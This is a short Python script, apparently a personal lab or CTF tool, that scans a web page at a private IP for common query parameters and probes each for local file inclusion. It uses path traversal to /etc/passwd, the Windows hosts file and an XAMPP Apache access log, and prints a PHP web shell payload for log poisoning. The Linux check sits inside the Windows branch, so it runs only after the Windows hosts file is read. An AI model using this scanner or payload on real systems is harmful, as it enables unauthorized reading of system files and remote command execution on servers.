import requests
ip_addr = "http://192.168.105.53:4443/site"
lyst=["?cat=","?dir=","?action=","?board=","?date=","?detail=","?file=","?download=","?path=","?folder=","?prefix=","?include=","?page=","?inc=","?locate=","?show=","?doc=","?site=","?type=","?view=","?content=","?document=","?layout=","?mod=","?conf="]
lin = "../../../../../../../../../../../../etc/passwd"
win = "C:/WINDOWS/System32/drivers/etc/hosts"
loginject = "C:\\xampp\\apache\\logs\\access.log" 


with open('param.txt','w') as param:
        r = requests.get(ip_addr)
        r = r.content
        param.write(str(r))
        param.close()
with open('param.txt','r') as param:
	for x in param:
		for element in lyst:
			if element in x:
				print('found param '+ip_addr+element)
				print('checking for possible lfi')
				url = ip_addr+element
				#check for windows hosts file
				r = requests.get(url+win)
				r = r.text
				if "This is a sample HOSTS file" in r:
					print('access is granted to the hosts file\n'+url+win)
				#check for windows apache2 log file access
					print('checking for access to apache log files\n'+url+loginject)	
					r = requests.get(url+loginject)
					if r.status_code == 200:
						print('access is granted to log file try log poisoning')
						print("<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>")
						break
				#check for linux lfi
					r = requests.get(url+lin)
					r = r.text
					if "root" in r:
						print('access is granted to the /etc/passwd file\n'+url+lin)
						print(r)
						break

						
